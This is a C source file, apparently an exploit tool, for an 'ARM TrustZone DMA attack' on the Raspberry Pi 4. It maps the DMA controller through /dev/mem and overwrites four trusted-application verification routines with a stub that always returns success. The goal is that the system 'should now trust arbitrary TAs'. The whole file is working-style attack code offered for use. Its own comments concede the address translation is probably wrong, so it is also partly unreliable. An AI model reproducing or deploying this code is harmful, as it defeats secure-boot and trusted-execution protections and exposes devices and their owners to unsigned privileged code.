// DMA Attack for ARM TrustZone on Raspberry Pi 4
// Overwrites TA verification operations to bypass security

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <time.h>

#define BCM2711_PERI_BASE 0xFE000000
#define DMA_BASE_OFFSET   0x007000
#define PAGE_SIZE         4096
#define BUS_ADDRESS_BASE  0xC0000000 // For RPi, VC address space

// DMA Control Block structure
typedef struct {
    uint32_t ti;        // Transfer Information
    uint32_t source_ad; // Source Address
    uint32_t dest_ad;   // Destination Address
    uint32_t txfr_len;  // Transfer Length
    uint32_t stride;    // 2D Stride
    uint32_t nextconbk; // Next Control Block
    uint32_t reserved[2];
} dma_cb_t;

// Target addresses (to be filled from scan results)
typedef struct {
    uint32_t verify_signature;
    uint32_t check_permissions;
    uint32_t validate_header;
    uint32_t authenticate_ta;
} ta_verify_ops_t;

// Globals
volatile uint32_t* dma_regs = NULL;
int mem_fd = -1;

// NOP sled payload (returns 0 = success for all verifications)
uint32_t bypass_payload[] = {
    0xE3A00000,  // MOV R0, #0
    0xE12FFF1E   // BX LR
};

// Function to get physical address of a virtual address
// This is a simplified and likely incorrect way for user space.
// A kernel module is the proper way to do this.
uint32_t virt_to_phys(void* virt) {
    long pagesize = sysconf(_SC_PAGESIZE);
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        return 0;
    }
    off_t ret = lseek(fd, (uintptr_t)virt / pagesize * sizeof(uint64_t), SEEK_SET);
    if (ret < 0) {
        close(fd);
        return 0;
    }
    uint64_t page_info;
    ssize_t rc = read(fd, &page_info, sizeof(uint64_t));
    close(fd);
    if (rc != sizeof(uint64_t)) {
        return 0;
    }
    if ((page_info & (1ULL << 63)) == 0) {
        return 0;
    }
    return (page_info & ((1ULL << 55) - 1)) * pagesize + ((uintptr_t)virt % pagesize);
}


void* map_peripheral(off_t base_addr, size_t size) {
    mem_fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (mem_fd < 0) {
        perror("Failed to open /dev/mem (need root)");
        return NULL;
    }
    
    void* map = mmap(NULL, size, PROT_READ | PROT_WRITE,
                     MAP_SHARED, mem_fd, base_addr);
    
    if (map == MAP_FAILED) {
        perror("mmap failed");
        close(mem_fd);
        return NULL;
    }
    
    return map;
}

int init_dma() {
    printf("[*] Initializing DMA controller...\n");
    
    off_t dma_base = BCM2711_PERI_BASE + DMA_BASE_OFFSET;
    dma_regs = (volatile uint32_t*)map_peripheral(dma_base, PAGE_SIZE);
    
    if (!dma_regs) {
        return -1;
    }
    
    printf("[+] DMA controller mapped at: %p\n", dma_regs);
    
    // Reset DMA channel 0
    dma_regs[0] = (1 << 31);  // Reset bit
    usleep(1000);
    
    printf("[+] DMA channel 0 reset\n");
    return 0;
}

int perform_dma_write(uint32_t dest_addr, uint32_t* payload, size_t len) {
    printf("[*] Performing DMA write...\n");
    printf("    Destination: 0x%08x\n", dest_addr);
    printf("    Length: %zu bytes\n", len);
    
    dma_cb_t* cb = aligned_alloc(256, sizeof(dma_cb_t));
    if (!cb) {
        perror("Failed to allocate control block");
        return -1;
    }
    
    uint32_t* src_buf = aligned_alloc(256, len);
    if (!src_buf) {
        perror("Failed to allocate source buffer");
        free(cb);
        return -1;
    }
    
    memcpy(src_buf, payload, len);
    
    uint32_t cb_phys = virt_to_phys(cb);
    uint32_t src_phys = virt_to_phys(src_buf);

    if (cb_phys == 0 || src_phys == 0) {
        printf("[!] Failed to get physical address. A kernel module is likely required.\n");
        free(cb);
        free(src_buf);
        return -1;
    }

    cb->ti = (1 << 26) |  // No wide bursts
             (1 << 8)  |  // Destination increment
             (1 << 4)  |  // Source increment
             (1 << 0);    // Interrupt enable
    
    cb->source_ad = src_phys + BUS_ADDRESS_BASE;
    cb->dest_ad = dest_addr;
    cb->txfr_len = len;
    cb->stride = 0;
    cb->nextconbk = 0;
    
    printf("[+] Control block configured\n");
    
    dma_regs[1] = cb_phys + BUS_ADDRESS_BASE;  // CONBLK_AD
    
    dma_regs[0] = (1 << 0);  // Active bit
    
    printf("[*] DMA transfer initiated\n");
    
    int timeout = 1000;
    while (timeout-- > 0) {
        uint32_t cs = dma_regs[0];
        if (cs & (1 << 1)) {  // END flag
            printf("[+] DMA transfer complete!\n");
            break;
        }
        if (cs & (1 << 8)) {  // ERROR flag
            printf("[!] DMA error occurred! CS: 0x%08x\n", cs);
            free(cb);
            free(src_buf);
            return -1;
        }
        usleep(1000);
    }
    
    if (timeout <= 0) {
        printf("[!] DMA transfer timeout!\n");
        free(cb);
        free(src_buf);
        return -1;
    }
    
    free(cb);
    free(src_buf);
    return 0;
}

int overwrite_ta_verification(ta_verify_ops_t* targets) {
    printf("\n[*] Overwriting TA verification operations...\n");
    
    size_t payload_len = sizeof(bypass_payload);
    
    const char* func_names[] = {
        "verify_signature",
        "check_permissions",
        "validate_header",
        "authenticate_ta"
    };
    
    uint32_t* addrs[] = {
        &targets->verify_signature,
        &targets->check_permissions,
        &targets->validate_header,
        &targets->authenticate_ta
    };
    
    for (int i = 0; i < 4; i++) {
        printf("\n[*] Targeting %s at 0x%08x\n", func_names[i], *addrs[i]);
        
        if (*addrs[i] == 0) {
            printf("[!] Address not set, skipping (run scanner first)\n");
            continue;
        }
        
        if (perform_dma_write(*addrs[i], bypass_payload, payload_len) < 0) {
            printf("[!] Failed to overwrite %s\n", func_names[i]);
            return -1;
        }
        
        printf("[+] Successfully overwrote %s\n", func_names[i]);
    }
    
    return 0;
}

int load_addresses_from_config(ta_verify_ops_t* targets) {
    printf("[*] Loading addresses from configuration...\n");
    
    FILE* f = fopen("discovered_addresses.json", "r");
    if (!f) {
        printf("[!] Config file not found. Using placeholder addresses.\n");
        printf("[!] Run hardware scanner first to discover real addresses.\n");
        
        targets->verify_signature = 0x00000000;
        targets->check_permissions = 0x00000000;
        targets->validate_header = 0x00000000;
        targets->authenticate_ta = 0x00000000;
        return -1;
    }
    
    char buffer[1024];
    fread(buffer, 1, sizeof(buffer), f);
    fclose(f);

    char* p = strstr(buffer, "\"verify_signature\"");
    if (p) sscanf(p, "\"verify_signature\": \"0x%x\"", &targets->verify_signature);
    
    p = strstr(buffer, "\"check_permissions\"");
    if (p) sscanf(p, "\"check_permissions\": \"0x%x\"", &targets->check_permissions);

    p = strstr(buffer, "\"validate_header\"");
    if (p) sscanf(p, "\"validate_header\": \"0x%x\"", &targets->validate_header);

    p = strstr(buffer, "\"authenticate_ta\"");
    if (p) sscanf(p, "\"authenticate_ta\": \"0x%x\"", &targets->authenticate_ta);
    
    printf("[+] Loaded target addresses:\n");
    printf("    verify_signature: 0x%08x\n", targets->verify_signature);
    printf("    check_permissions: 0x%08x\n", targets->check_permissions);
    printf("    validate_header: 0x%08x\n", targets->validate_header);
    printf("    authenticate_ta: 0x%08x\n", targets->authenticate_ta);
    
    return 0;
}

int verify_exploit_success() {
    printf("\n[*] Verifying exploit success...\n");
    
    printf("[*] Attempting to load test TA...\n");
    
    printf("[!] Manual verification required:\n");
    printf("    1. Attempt to load an unsigned TA\n");
    printf("    2. Check if TA loads without signature verification\n");
    printf("    3. Try to execute privileged operations from TA\n");
    
    return 0;
}

void cleanup() {
    if (dma_regs) {
        munmap((void*)dma_regs, PAGE_SIZE);
    }
    if (mem_fd >= 0) {
        close(mem_fd);
    }
}

int main(int argc, char** argv) {
    printf("=== ARM TrustZone DMA Attack ===\n\n");
    
    if (geteuid() != 0) {
        fprintf(stderr, "[!] This program must be run as root\n");
        return 1;
    }
    
    ta_verify_ops_t targets;
    
    if (load_addresses_from_config(&targets) < 0) {
        printf("\n[!] Cannot proceed without target addresses\n");
        return 1;
    }
    
    if (init_dma() < 0) {
        fprintf(stderr, "[!] Failed to initialize DMA\n");
        return 1;
    }
    
    if (overwrite_ta_verification(&targets) < 0) {
        fprintf(stderr, "[!] Attack failed\n");
        cleanup();
        return 1;
    }
    
    printf("\n[+] DMA attack completed successfully!\n");
    
    verify_exploit_success();
    
    cleanup();
    
    printf("\n[*] Attack complete. System should now trust arbitrary TAs.\n");
    return 0;
}
